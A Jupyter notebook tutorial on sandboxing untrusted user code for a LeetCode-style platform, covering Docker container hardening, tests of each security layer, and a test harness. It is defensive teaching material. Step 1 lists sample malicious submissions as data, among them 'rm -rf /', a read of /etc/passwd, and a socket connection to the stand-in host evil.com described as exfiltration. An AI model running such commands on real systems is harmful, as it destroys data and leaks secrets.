# 📖 Notebook 2: Sandboxed Code Execution

The hardest part of building LeetCode isn't the website — it's **safely running code written by strangers**.

Think about it: users can type *anything* into the code editor. They might submit a
perfectly valid Two Sum solution… or they might submit code that tries to delete your
server's files, steal data, or simply crash everything with an infinite loop.

This notebook explores **why isolation matters** and how to achieve it with containers.

---

## 🎯 Learning Objectives

By the end of this notebook, you will:

1. **Understand the security risks** of running untrusted code on your server
2. **Compare execution approaches** (direct exec, VMs, containers, serverless)
3. **Implement container-based sandboxing** using the Docker SDK for Python
4. **Build a test harness** that runs test cases against user-submitted code
5. **Measure execution performance** (runtime and memory usage)

## 🛠️ Setup

### 1. Start the infrastructure

Open a terminal in the `system-designs/leetcode/` folder and run:

```bash
docker compose up -d
```

This starts **five** services:

| Service | What it does | URL / Port |
|---------|-------------|------------|
| PostgreSQL | Stores problems, submissions | `localhost:5432` |
| Redis | Caching & leaderboards | `localhost:6379` |
| Sandbox | Isolated Python container for running user code | (no port — accessed via Docker SDK) |
| Adminer | Web UI to browse PostgreSQL | [http://localhost:8080](http://localhost:8080) |
| RedisInsight | Web UI to browse Redis | [http://localhost:5540](http://localhost:5540) |

### 2. Install Python dependencies

```bash
cd system-designs/leetcode
uv venv
source .venv/bin/activate
uv sync
```

### 3. Select the kernel

In VS Code, click the **kernel picker** (top-right of this notebook) and select the
`.venv` environment you just created. If it doesn't appear, reload the window:
`Cmd+Shift+P` → **"Reload Window"**.

In [1]:
# === 🔌 Connection Setup ===

import docker
import psycopg2
import psycopg2.extras
import json
import time
import textwrap

# --- Database configuration ---
DB_CONFIG = {
    "host": "localhost",
    "port": 5432,
    "dbname": "leetcode_demo",
    "user": "demo",
    "password": "demo",
}

def get_db():
    """Create a new database connection."""
    conn = psycopg2.connect(**DB_CONFIG)
    conn.autocommit = True
    return conn

def query(sql, params=None):
    """Run a SQL query and return all rows as dictionaries."""
    conn = get_db()
    with conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor) as cur:
        cur.execute(sql, params)
        rows = cur.fetchall()
    conn.close()
    return rows

# --- Docker client ---
client = docker.from_env()

# Verify the sandbox container is running
sandbox = client.containers.get("leetcode-sandbox")
print(f"✅ Sandbox container status: {sandbox.status}")
print(f"   Image: {sandbox.image.tags}")

# Quick DB check
problems = query("SELECT id, title, difficulty FROM problems ORDER BY id")
print(f"\n✅ Database connected — {len(problems)} problems loaded")
for p in problems:
    print(f"   #{p['id']} {p['title']} ({p['difficulty']})")

✅ Sandbox container status: running
   Image: ['python:3.12-slim']

✅ Database connected — 10 problems loaded
   #1 Two Sum (easy)
   #2 Valid Parentheses (easy)
   #3 Merge Intervals (medium)
   #4 LRU Cache (medium)
   #5 Maximum Depth of Binary Tree (easy)
   #6 Longest Substring Without Repeating Characters (medium)
   #7 Median of Two Sorted Arrays (hard)
   #8 Trapping Rain Water (hard)
   #9 Number of Islands (medium)
   #10 Serialize and Deserialize Binary Tree (hard)


---

## ☠️ Step 1: Why You Can't Just `exec()` User Code

Python has a built-in function called `exec()` that runs a string as code.
It's tempting to use it:

```python
user_code = request.body  # whatever the user typed
exec(user_code)           # run it!
```

Seems easy, right? But what if someone submits this?

```python
import os; os.system("rm -rf /")            # 💀 Delete everything on your server
import socket; socket.connect(("evil.com", 80))  # 🕵️ Steal your data
while True: pass                              # 🔄 Infinite loop — freeze your server
open("/etc/passwd").read()                    # 🔑 Read sensitive system files
```

**All of these would run with the same permissions as your web server.**

Let's see a safe demonstration of how `exec()` works:

In [2]:
# === Safe demo: exec() runs code from a string ===

# This is fine — just a simple math expression
safe_code = "result = 2 + 2"
namespace = {}
exec(safe_code, namespace)
print(f"exec() result: {namespace['result']}")  # 4

# But imagine if the user submitted THIS instead:
# (We're NOT running these — just showing what they would do)

malicious_examples = [
    {
        "code": 'import os; os.system("rm -rf /")',
        "danger": "Deletes ALL files on the server",
    },
    {
        "code": 'import subprocess; subprocess.run(["cat", "/etc/passwd"])',
        "danger": "Reads sensitive system files",
    },
    {
        "code": 'import socket; s = socket.socket(); s.connect(("evil.com", 80))',
        "danger": "Opens a network connection to exfiltrate data",
    },
    {
        "code": 'while True: pass',
        "danger": "Infinite loop — freezes the server process forever",
    },
    {
        "code": 'x = "A" * (10 ** 10)',
        "danger": "Allocates 10 GB of memory — crashes the server",
    },
]

print("\n⚠️  Examples of malicious code (NOT executed):")
print("=" * 60)
for i, ex in enumerate(malicious_examples, 1):
    print(f"\n{i}. Code:   {ex['code']}")
    print(f"   Danger: {ex['danger']}")

exec() result: 4

⚠️  Examples of malicious code (NOT executed):

1. Code:   import os; os.system("rm -rf /")
   Danger: Deletes ALL files on the server

2. Code:   import subprocess; subprocess.run(["cat", "/etc/passwd"])
   Danger: Reads sensitive system files

3. Code:   import socket; s = socket.socket(); s.connect(("evil.com", 80))
   Danger: Opens a network connection to exfiltrate data

4. Code:   while True: pass
   Danger: Infinite loop — freezes the server process forever

5. Code:   x = "A" * (10 ** 10)
   Danger: Allocates 10 GB of memory — crashes the server


### The Three Problems with Direct Execution

| Problem | What happens | Example |
|---------|-------------|----------|
| **🔓 Security** | User code has full access to the host OS | Read files, delete data, install malware |
| **📈 No Resource Limits** | Code can use unlimited CPU, memory, disk | Infinite loops, memory bombs |
| **💥 No Isolation** | A crash in user code crashes your server | Segfaults, stack overflows, `sys.exit()` |

### How do real platforms solve this?

| Approach | Startup Time | Isolation | Resource Usage | Our Choice? |
|----------|-------------|-----------|---------------|-------------|
| **Direct exec** | 0 ms | None ❌ | Shared with server | No |
| **Virtual Machine** | 30–60 s | Strong ✅ | Heavy (runs a full OS) | No |
| **Container** | < 1 s | Good ✅ | Lightweight | **Yes ✅** |
| **Serverless (Lambda)** | 0–5 s (cold start) | Strong ✅ | Pay-per-use | Maybe later |

We'll use **containers** because they give us strong isolation with very fast startup.

---

## 🐳 Step 2: Our Sandbox Container

Our `docker-compose.yml` includes a **sandbox** service. It's a plain Python container
that sits there waiting (`sleep infinity`), and we execute user code *inside* it using
the Docker SDK.

Here's the key: the container has **multiple security layers** stacked on top of each
other. Even if an attacker breaks through one layer, the next layer stops them:

```
┌─────────────────────────────────────────┐
│  SANDBOX CONTAINER                       │
│  ┌─────────────────────────────────────┐ │
│  │ 📁 Read-only filesystem             │ │
│  │ (can only write to /tmp, max 64 MB) │ │
│  ├─────────────────────────────────────┤ │
│  │ 🧠 Memory limit: 256 MB            │ │
│  │ ⚡ CPU limit: 0.5 cores             │ │
│  ├─────────────────────────────────────┤ │
│  │ 🌐 No network access               │ │
│  │ (network_mode: none)                │ │
│  ├─────────────────────────────────────┤ │
│  │ 🔒 No privilege escalation          │ │
│  │ (security_opt: no-new-privileges)   │ │
│  └─────────────────────────────────────┘ │
└─────────────────────────────────────────┘
```

**Why each layer matters:**

- **Read-only filesystem** → User code can't install malware or modify system files
- **Memory & CPU limits** → Memory bombs and infinite loops can't take down the host
- **No network** → Code can't phone home or attack other services
- **No privilege escalation** → Even if they find a vulnerability, they can't become root

Let's inspect our sandbox container to verify these settings:

In [3]:
# === Inspect the sandbox container's security settings ===

container = client.containers.get("leetcode-sandbox")
attrs = container.attrs

print("🐳 Sandbox Container Configuration")
print("=" * 50)

# Basic info
print(f"\nImage:    {container.image.tags}")
print(f"Status:   {container.status}")
print(f"Command:  {attrs['Config']['Cmd']}")

# Host config has the security settings
host_config = attrs["HostConfig"]

# Filesystem
print(f"\n📁 Read-only rootfs: {host_config.get('ReadonlyRootfs', False)}")
tmpfs = host_config.get("Tmpfs", {})
print(f"   Tmpfs mounts:     {tmpfs}")

# Resource limits
memory_bytes = host_config.get("Memory", 0)
print(f"\n🧠 Memory limit:  {memory_bytes / 1024 / 1024:.0f} MB")
nano_cpus = host_config.get("NanoCpus", 0)
print(f"⚡ CPU limit:     {nano_cpus / 1e9} cores")

# Network
network_mode = host_config.get("NetworkMode", "default")
print(f"\n🌐 Network mode:  {network_mode}")

# Security options
security_opt = host_config.get("SecurityOpt", [])
print(f"🔒 Security opts: {security_opt}")

🐳 Sandbox Container Configuration

Image:    ['python:3.12-slim']
Status:   running
Command:  ['sleep', 'infinity']

📁 Read-only rootfs: True
   Tmpfs mounts:     {'/tmp': 'size=64m'}

🧠 Memory limit:  256 MB
⚡ CPU limit:     0.5 cores

🌐 Network mode:  none
🔒 Security opts: ['no-new-privileges:true']


---

## 🔒 Step 3: Testing the Security Layers

Let's verify that each security layer actually works. We'll try to break out of the
sandbox in different ways and confirm that the container stops us every time.

### Test 1: Read-only Filesystem

In [4]:
# === Test 1: Read-only filesystem ===

container = client.containers.get("leetcode-sandbox")

# Try to create a file in the root filesystem — should FAIL
exit_code, output = container.exec_run("touch /test_file")
print("Attempt: touch /test_file")
print(f"  Exit code: {exit_code} {'✅ Blocked!' if exit_code != 0 else '❌ Uh oh'}")
if output:
    print(f"  Error: {output.decode().strip()}")

print()

# Try to write to /tmp — should SUCCEED (tmpfs is writable)
exit_code, output = container.exec_run("touch /tmp/test_file")
print("Attempt: touch /tmp/test_file")
print(f"  Exit code: {exit_code} {'✅ Allowed (expected)' if exit_code == 0 else '❌ Unexpected'}")

# Clean up
container.exec_run("rm -f /tmp/test_file")

print("\n💡 The filesystem is read-only except for /tmp.")
print("   User code can create temp files in /tmp (up to 64 MB) but nothing else.")

Attempt: touch /test_file
  Exit code: 1 ✅ Blocked!
  Error: touch: cannot touch '/test_file': Read-only file system



Attempt: touch /tmp/test_file
  Exit code: 0 ✅ Allowed (expected)

💡 The filesystem is read-only except for /tmp.
   User code can create temp files in /tmp (up to 64 MB) but nothing else.


### Test 2: No Network Access

In [5]:
# === Test 2: No network access ===

container = client.containers.get("leetcode-sandbox")

# Try to make an HTTP request from inside the sandbox
code = "import urllib.request; urllib.request.urlopen('http://google.com')"
exit_code, output = container.exec_run(["python3", "-c", code])

print("Attempt: Make an HTTP request to google.com")
print(f"  Exit code: {exit_code} {'✅ Blocked!' if exit_code != 0 else '❌ Uh oh'}")

# Show just the last line of the error (the important part)
error_lines = output.decode().strip().split("\n")
print(f"  Error: {error_lines[-1]}")

print("\n💡 The container has NO network access (network_mode: none).")
print("   User code cannot make HTTP requests, open sockets, or exfiltrate data.")

Attempt: Make an HTTP request to google.com
  Exit code: 1 ✅ Blocked!
  Error: urllib.error.URLError: <urlopen error [Errno -3] Temporary failure in name resolution>

💡 The container has NO network access (network_mode: none).
   User code cannot make HTTP requests, open sockets, or exfiltrate data.


### Test 3: Memory Limit

In [6]:
# === Test 3: Memory limit ===

container = client.containers.get("leetcode-sandbox")

# Try to allocate 500 MB in 1-MB chunks, *writing* to each chunk so the pages
# are actually resident. A plain `bytearray(N)` can be lazily backed by the
# kernel's zero-page and never actually hit the cgroup limit — so we force
# real allocations by filling each chunk with 'x' bytes.
code = """
chunks = []
try:
    for _ in range(500):                 # 500 x 1 MB = 500 MB
        chunks.append(bytearray(b'x' * (1024 * 1024)))
    print(f'Allocated {len(chunks)} MB successfully (limit NOT enforced!)')
except MemoryError:
    print(f'MemoryError: Python refused after {len(chunks)} MB')
"""
exit_code, output = container.exec_run(["python3", "-c", code])

print("Attempt: Allocate 500 MB of memory (limit is 256 MB)")
print(f"  Exit code: {exit_code}  ", end="")
# Exit 137 = killed by SIGKILL, which is what the Linux OOM-killer sends
# when a cgroup blows past its memory.max.
if exit_code == 137:
    print("✅ Killed by OOM-killer (SIGKILL 137)")
elif exit_code != 0:
    print("✅ Process terminated abnormally — limit held")
else:
    print("⚠️  Allocation succeeded — limit not enforced on this host")
print(f"  Output: {output.decode(errors='replace').strip() or '(killed before any output)'}")

print("\n💡 The container has a 256 MB memory limit with swap disabled")
print("   (mem_limit=256m, memswap_limit=256m in docker-compose.yml).")
print("   When a process exceeds this, the kernel's OOM-killer terminates")
print("   it with exit code 137 — no way around it.")
print("\n   ⚠️  Note: On Docker Desktop (Mac/Windows), containers run inside a")
print("   VM and memory accounting can be looser than on native Linux. If you")
print("   see 'limit not enforced', try the same code on a Linux server — the")
print("   cgroup enforcement is strict there.")


Attempt: Allocate 500 MB of memory (limit is 256 MB)
  Exit code: 137  ✅ Killed by OOM-killer (SIGKILL 137)
  Output: (killed before any output)

💡 The container has a 256 MB memory limit with swap disabled
   (mem_limit=256m, memswap_limit=256m in docker-compose.yml).
   When a process exceeds this, the kernel's OOM-killer terminates
   it with exit code 137 — no way around it.

   ⚠️  Note: On Docker Desktop (Mac/Windows), containers run inside a
   VM and memory accounting can be looser than on native Linux. If you
   see 'limit not enforced', try the same code on a Linux server — the
   cgroup enforcement is strict there.


### Test 4: CPU Timeout (Infinite Loops)

In [7]:
# === Test 4: CPU / timeout protection ===
# We use a Python-level timeout since we control the exec call.

import threading

container = client.containers.get("leetcode-sandbox")

# Run an infinite loop with a timeout
# We use `timeout` in a wrapper script inside the container
code = "while True: pass"

print("Attempt: Run an infinite loop (with 3-second timeout)")
start = time.time()

# Use the `timeout` command available in the container
exit_code, output = container.exec_run(
    ["timeout", "3", "python3", "-c", code]
)
elapsed = time.time() - start

print(f"  Exit code: {exit_code} (124 = killed by timeout) {'✅ Killed!' if exit_code == 124 else ''}")
print(f"  Wall time: {elapsed:.1f}s")

print("\n💡 The `timeout` command kills the process after N seconds.")
print("   Combined with 0.5 CPU cores, infinite loops can't steal resources.")

Attempt: Run an infinite loop (with 3-second timeout)


  Exit code: 124 (124 = killed by timeout) ✅ Killed!
  Wall time: 3.1s

💡 The `timeout` command kills the process after N seconds.
   Combined with 0.5 CPU cores, infinite loops can't steal resources.


---

## 🚀 Step 4: Running Code in the Sandbox

Now let's build a function that actually runs user-submitted code inside the sandbox.

The flow looks like this:

```
User submits code
       │
       ▼
Write code to /tmp/solution.py inside the container
       │
       ▼
Execute: python3 /tmp/solution.py
       │
       ▼
Capture stdout, stderr, and exit code
       │
       ▼
Return results to the caller
```

In [8]:
# === Core sandbox execution function ===

def run_in_sandbox(code: str, timeout: int = 5) -> dict:
    """
    Run Python code inside the sandbox container.

    Args:
        code: The Python code to execute.
        timeout: Max seconds before the process is killed.

    Returns:
        dict with 'exit_code', 'stdout', 'stderr', 'timed_out', 'elapsed_s'
    """
    container = client.containers.get("leetcode-sandbox")

    # Step 1: Write the user's code to a file inside the container.
    # We use a bash heredoc with a QUOTED terminator ("ENDOFCODE") so the
    # shell does NOT expand variables or backticks inside the code — that
    # way a user's `$PATH` or backticks can't be re-interpreted by bash.
    container.exec_run([
        "bash", "-c",
        f'cat > /tmp/solution.py << "ENDOFCODE"\n{code}\nENDOFCODE',
    ])

    # Step 2: Run the code with a hard wall-clock timeout via the
    # `timeout` command (returns exit code 124 when it fires).
    start = time.time()
    exit_code, output = container.exec_run(
        ["timeout", str(timeout), "python3", "/tmp/solution.py"],
        demux=True,  # separate stdout and stderr
    )
    elapsed = time.time() - start

    # Step 3: Parse output.
    stdout = output[0].decode().strip() if output[0] else ""
    stderr = output[1].decode().strip() if output[1] else ""

    # Step 4: Clean up — don't leave user code lying around in /tmp.
    container.exec_run(["rm", "-f", "/tmp/solution.py"])

    return {
        "exit_code": exit_code,
        "stdout": stdout,
        "stderr": stderr,
        "timed_out": exit_code == 124,
        "elapsed_s": round(elapsed, 3),
    }

print("✅ run_in_sandbox() function defined")


✅ run_in_sandbox() function defined


In [9]:
# === Test: Run a simple print statement ===

result = run_in_sandbox('print("Hello from the sandbox! 🏖️")')

print(f"Exit code:  {result['exit_code']}")
print(f"Stdout:     {result['stdout']}")
print(f"Stderr:     {result['stderr']}")
print(f"Timed out:  {result['timed_out']}")
print(f"Elapsed:    {result['elapsed_s']}s")

Exit code:  0
Stdout:     Hello from the sandbox! 🏖️
Stderr:     
Timed out:  False
Elapsed:    0.022s


In [10]:
# === Test: Run a Two Sum solution ===

user_code = textwrap.dedent("""\
    class Solution:
        def twoSum(self, nums, target):
            seen = {}
            for i, num in enumerate(nums):
                complement = target - num
                if complement in seen:
                    return [seen[complement], i]
                seen[num] = i

    # Quick test
    sol = Solution()
    print(sol.twoSum([2, 7, 11, 15], 9))
    print(sol.twoSum([3, 2, 4], 6))
""")

result = run_in_sandbox(user_code)
print(f"Output:\n{result['stdout']}")
print(f"\nElapsed: {result['elapsed_s']}s")

Output:
[0, 1]
[1, 2]

Elapsed: 0.021s


---

## 🧪 Step 5: The Test Harness

Running code is only half the battle. We also need to **check if the code is correct**.

LeetCode does this by running the user's code against a set of **test cases**:

```
Test Case 1:  Input: nums=[2,7,11,15], target=9  →  Expected: [0,1]
Test Case 2:  Input: nums=[3,2,4], target=6       →  Expected: [1,2]
```

Our database already stores test cases as JSON. Let's build a **test harness** — a
Python script that:

1. Contains the user's `Solution` class
2. Reads test case inputs
3. Calls the solution method with each test case
4. Compares outputs to expected results
5. Prints results as JSON (so we can parse them easily)

Let's start by looking at how test cases are stored:

In [11]:
# === Fetch test cases for Two Sum ===

rows = query("""
    SELECT id, title, test_cases, code_stubs->'python' AS python_stub
    FROM problems
    WHERE title = 'Two Sum'
""")

problem = rows[0]
print(f"Problem: #{problem['id']} — {problem['title']}")
print(f"\nPython stub:")
print(problem['python_stub'])

print(f"\nTest cases ({len(problem['test_cases'])} total):")
for i, tc in enumerate(problem['test_cases']):
    print(f"  Test {i+1}: input={tc['input']}  →  expected={tc['expected']}")

Problem: #1 — Two Sum

Python stub:
class Solution:
    def twoSum(self, nums: list[int], target: int) -> list[int]:
        pass

Test cases (2 total):
  Test 1: input={'nums': [2, 7, 11, 15], 'target': 9}  →  expected=[0, 1]
  Test 2: input={'nums': [3, 2, 4], 'target': 6}  →  expected=[1, 2]


In [12]:
# === Build the test harness ===

def build_test_harness(user_code: str, method_name: str, test_cases: list) -> str:
    """
    Generate a Python script that combines the user's code with a test runner.

    The script:
      1. Defines the user's Solution class
      2. Creates an instance of it
      3. Runs each test case
      4. Prints results as JSON
    """
    test_cases_json = json.dumps(test_cases)

    harness = f"""\
import json
import time

# ---- User's code ----
{user_code}

# ---- Test runner ----
test_cases = json.loads('{test_cases_json}')
sol = Solution()
results = []

for i, tc in enumerate(test_cases):
    try:
        start = time.time()
        # Unpack the input dict as keyword arguments
        actual = sol.{method_name}(**tc["input"])
        elapsed_ms = (time.time() - start) * 1000

        passed = actual == tc["expected"]
        results.append({{
            "test": i + 1,
            "passed": passed,
            "expected": tc["expected"],
            "actual": actual,
            "runtime_ms": round(elapsed_ms, 2),
        }})
    except Exception as e:
        results.append({{
            "test": i + 1,
            "passed": False,
            "error": str(e),
        }})

print(json.dumps(results))
"""
    return harness

print("✅ build_test_harness() function defined")

✅ build_test_harness() function defined


In [13]:
# === Run test cases against user code ===

def run_with_test_cases(problem_id: int, user_code: str) -> dict:
    """
    Fetch test cases for a problem, build a test harness, run it in the sandbox,
    and return structured results.

    Returns:
        dict with 'problem', 'passed', 'total', 'results', 'status'
    """
    # 1. Fetch problem info and test cases
    rows = query("""
        SELECT title, test_cases, code_stubs->'python' AS python_stub
        FROM problems WHERE id = %s
    """, (problem_id,))
    problem = rows[0]

    # 2. Figure out the method name from the code stub
    # The stub looks like: "class Solution:\n    def twoSum(self, ...):"
    stub = problem['python_stub'] or ''
    method_name = None
    for line in stub.split('\n'):
        line = line.strip()
        if line.startswith('def ') and line != 'def __init__':
            method_name = line.split('(')[0].replace('def ', '')
            break

    if not method_name:
        return {"error": "Could not determine method name from code stub"}

    # 3. Build the test harness script
    script = build_test_harness(user_code, method_name, problem['test_cases'])

    # 4. Run in sandbox
    result = run_in_sandbox(script, timeout=10)

    # 5. Parse results
    if result['timed_out']:
        return {
            "problem": problem['title'],
            "status": "time_limit",
            "message": "Code exceeded the time limit",
        }

    if result['exit_code'] != 0:
        return {
            "problem": problem['title'],
            "status": "runtime_error",
            "stderr": result['stderr'],
        }

    try:
        test_results = json.loads(result['stdout'])
    except json.JSONDecodeError:
        return {
            "problem": problem['title'],
            "status": "runtime_error",
            "message": "Could not parse test output",
            "raw_output": result['stdout'],
        }

    passed = sum(1 for r in test_results if r.get('passed'))
    total = len(test_results)

    return {
        "problem": problem['title'],
        "status": "accepted" if passed == total else "wrong_answer",
        "passed": passed,
        "total": total,
        "results": test_results,
    }

print("✅ run_with_test_cases() function defined")

✅ run_with_test_cases() function defined


In [14]:
# === Run a CORRECT Two Sum solution ===

correct_solution = textwrap.dedent("""\
    class Solution:
        def twoSum(self, nums, target):
            seen = {}
            for i, num in enumerate(nums):
                complement = target - num
                if complement in seen:
                    return [seen[complement], i]
                seen[num] = i
""")

result = run_with_test_cases(problem_id=1, user_code=correct_solution)

print(f"Problem:  {result['problem']}")
print(f"Status:   {result['status']} {'✅' if result['status'] == 'accepted' else '❌'}")
print(f"Tests:    {result['passed']}/{result['total']} passed")
print()
for r in result['results']:
    icon = '✅' if r['passed'] else '❌'
    print(f"  Test {r['test']}: {icon}  expected={r['expected']}  actual={r['actual']}  ({r['runtime_ms']}ms)")

Problem:  Two Sum
Status:   accepted ✅
Tests:    2/2 passed

  Test 1: ✅  expected=[0, 1]  actual=[0, 1]  (0.0ms)
  Test 2: ✅  expected=[1, 2]  actual=[1, 2]  (0.0ms)


In [15]:
# === Run an INCORRECT Two Sum solution ===

wrong_solution = textwrap.dedent("""\
    class Solution:
        def twoSum(self, nums, target):
            # Bug: always returns the first two indices
            return [0, 1]
""")

result = run_with_test_cases(problem_id=1, user_code=wrong_solution)

print(f"Problem:  {result['problem']}")
print(f"Status:   {result['status']} {'✅' if result['status'] == 'accepted' else '❌'}")
print(f"Tests:    {result['passed']}/{result['total']} passed")
print()
for r in result['results']:
    icon = '✅' if r['passed'] else '❌'
    print(f"  Test {r['test']}: {icon}  expected={r['expected']}  actual={r.get('actual', 'N/A')}")

Problem:  Two Sum
Status:   wrong_answer ❌
Tests:    1/2 passed

  Test 1: ✅  expected=[0, 1]  actual=[0, 1]
  Test 2: ❌  expected=[1, 2]  actual=[0, 1]


Notice how the wrong solution might pass the first test case by accident (since `[0, 1]`
happens to be correct for `nums=[2,7,11,15], target=9`), but it **fails** on the second
test case where the expected output is `[1, 2]`.

This is why platforms like LeetCode use **multiple test cases** — a single test is easy
to get right by accident!

---

## ⏱️ Step 6: Measuring Execution Performance

LeetCode doesn't just tell you *pass* or *fail* — it also shows:

- **Runtime**: How fast your solution ran (in milliseconds)
- **Memory**: How much memory your solution used (in KB)

Let's build a version of our harness that measures these metrics.

In [16]:
# === Test harness with performance measurement ===

def build_perf_harness(user_code: str, method_name: str, test_cases: list) -> str:
    """
    Like build_test_harness, but also measures runtime and memory usage.
    Uses tracemalloc (Python's built-in memory profiler).
    """
    test_cases_json = json.dumps(test_cases)

    harness = f"""\
import json
import time
import tracemalloc

# ---- User's code ----
{user_code}

# ---- Performance-measuring test runner ----
test_cases = json.loads('{test_cases_json}')
sol = Solution()
results = []

total_start = time.time()
tracemalloc.start()

for i, tc in enumerate(test_cases):
    try:
        start = time.time()
        actual = sol.{method_name}(**tc["input"])
        elapsed_ms = (time.time() - start) * 1000

        passed = actual == tc["expected"]
        results.append({{
            "test": i + 1,
            "passed": passed,
            "expected": tc["expected"],
            "actual": actual,
            "runtime_ms": round(elapsed_ms, 2),
        }})
    except Exception as e:
        results.append({{
            "test": i + 1,
            "passed": False,
            "error": str(e),
        }})

current, peak = tracemalloc.get_traced_memory()
tracemalloc.stop()
total_elapsed = (time.time() - total_start) * 1000

output = {{
    "results": results,
    "total_runtime_ms": round(total_elapsed, 2),
    "peak_memory_kb": round(peak / 1024, 2),
}}
print(json.dumps(output))
"""
    return harness

print("✅ build_perf_harness() function defined")

✅ build_perf_harness() function defined


In [17]:
# === Run with performance metrics ===

solution_code = textwrap.dedent("""\
    class Solution:
        def twoSum(self, nums, target):
            seen = {}
            for i, num in enumerate(nums):
                complement = target - num
                if complement in seen:
                    return [seen[complement], i]
                seen[num] = i
""")

# Fetch test cases
rows = query("SELECT test_cases FROM problems WHERE id = 1")
test_cases = rows[0]['test_cases']

# Build and run the performance-measuring harness
script = build_perf_harness(solution_code, "twoSum", test_cases)
result = run_in_sandbox(script, timeout=10)

if result['exit_code'] == 0:
    data = json.loads(result['stdout'])

    print("📊 Execution Results")
    print("=" * 50)

    for r in data['results']:
        icon = '✅' if r['passed'] else '❌'
        print(f"  Test {r['test']}: {icon}  ({r['runtime_ms']}ms)")

    print(f"\n  Total runtime:  {data['total_runtime_ms']}ms")
    print(f"  Peak memory:    {data['peak_memory_kb']} KB")
else:
    print(f"Error: {result['stderr']}")

📊 Execution Results
  Test 1: ✅  (0.01ms)
  Test 2: ✅  (0.0ms)

  Total runtime:  0.09ms
  Peak memory:    1.55 KB


In a production system like LeetCode, these performance numbers would be:

- **Compared to other users** to generate "beats X% of submissions" rankings
- **Used to enforce time limits** (e.g., O(n²) solutions fail on large inputs)
- **Stored in the database** alongside the submission status

### Let's try another problem: Valid Parentheses

Let's make sure our test harness works across different problems.

In [18]:
# === Test with a different problem: Valid Parentheses ===

parentheses_solution = textwrap.dedent("""\
    class Solution:
        def isValid(self, s: str) -> bool:
            stack = []
            pairs = {')': '(', '}': '{', ']': '['}
            for char in s:
                if char in pairs:
                    if not stack or stack[-1] != pairs[char]:
                        return False
                    stack.pop()
                else:
                    stack.append(char)
            return len(stack) == 0
""")

result = run_with_test_cases(problem_id=2, user_code=parentheses_solution)

print(f"Problem:  {result['problem']}")
print(f"Status:   {result['status']} {'✅' if result['status'] == 'accepted' else '❌'}")
print(f"Tests:    {result['passed']}/{result['total']} passed")
for r in result['results']:
    icon = '✅' if r['passed'] else '❌'
    print(f"  Test {r['test']}: {icon}  expected={r['expected']}  actual={r['actual']}")

Problem:  Valid Parentheses
Status:   accepted ✅
Tests:    3/3 passed
  Test 1: ✅  expected=True  actual=True
  Test 2: ✅  expected=True  actual=True
  Test 3: ✅  expected=False  actual=False


---

## 🧹 Cleanup

Remove any temporary files from the sandbox container.

In [19]:
# === Cleanup ===

container = client.containers.get("leetcode-sandbox")
container.exec_run("rm -rf /tmp/*")
print("🧹 Sandbox /tmp cleaned up")

# Note: To stop all services, run in your terminal:
# docker compose down

🧹 Sandbox /tmp cleaned up


---

## 🏭 Step 7: Production-Grade Sandboxing — Beyond Plain Containers

Plain Docker containers are good, but a determined attacker can sometimes
escape them through Linux kernel bugs (a **container breakout**). Companies
that run untrusted code at scale layer on **stronger isolation**:

| Tool | How it works | Used by |
|------|-------------|---------|
| **gVisor** (Google) | A user-space kernel that intercepts syscalls before they reach the host kernel — shrinks the attack surface dramatically | Google Cloud Run, App Engine |
| **Firecracker** (AWS) | Lightweight micro-VM with a minimal device model, boots in ~125 ms | AWS Lambda, Fargate |
| **Kata Containers** | Each container runs inside its own tiny VM — container UX with VM-level isolation | OpenStack, some Kubernetes setups |
| **Seccomp-BPF profiles** | Whitelist only the ~50 syscalls a judge needs (`read`, `write`, `exit`, ...) and block the rest | Docker's default profile, custom hardening |

**What LeetCode-style platforms actually use:** typically a combination —
Firecracker or gVisor for the outer isolation, *plus* a seccomp profile,
*plus* the resource limits (cpu/mem/pids/no-network/read-only-fs) we
demonstrated in this notebook. **Defense in depth:** if one layer is
breached, the next still holds.

A full gVisor/Firecracker lab is out of scope here (both require privileged
host setup), but now you know what the next step up from plain Docker looks
like.


---

## 📚 Summary

### Key Takeaways

1. **Never run untrusted code directly** — `exec()` and `subprocess` give user code
   full access to your server. That's a massive security risk.

2. **Containers provide good isolation with low overhead** — unlike VMs (which boot a
   whole OS in 30–60s), containers start in under a second and share the host kernel.

3. **Layer your security defenses** — no single layer is perfect, so we stack multiple:
   - Read-only filesystem (no persistent modifications)
   - Memory & CPU limits (no resource exhaustion)
   - No network access (no data exfiltration)
   - Timeouts (no infinite loops)
   - No privilege escalation (no container breakouts)

4. **A test harness lets you run the same tests against any solution** — just swap the
   user code, keep the test runner the same. This scales to any problem and language.

5. **The Docker SDK lets workers execute code inside containers** — in production,
   a background worker picks up submissions from a queue and runs them in sandboxes.

### Architecture So Far

```
┌──────────┐     ┌──────────┐     ┌─────────────────┐
│  User    │────▶│  API     │────▶│  PostgreSQL      │
│ Browser  │     │  Server  │     │  (problems,      │
└──────────┘     └────┬─────┘     │   submissions)   │
                      │           └─────────────────┘
                      ▼
              ┌───────────────┐
              │  Sandbox      │  ◀── This notebook!
              │  Container    │
              │  (isolated)   │
              └───────────────┘
```

### 🔜 Next Up

In **Notebook 3**, we'll build **real-time leaderboards** using Redis sorted sets —
the secret sauce behind live coding competition rankings!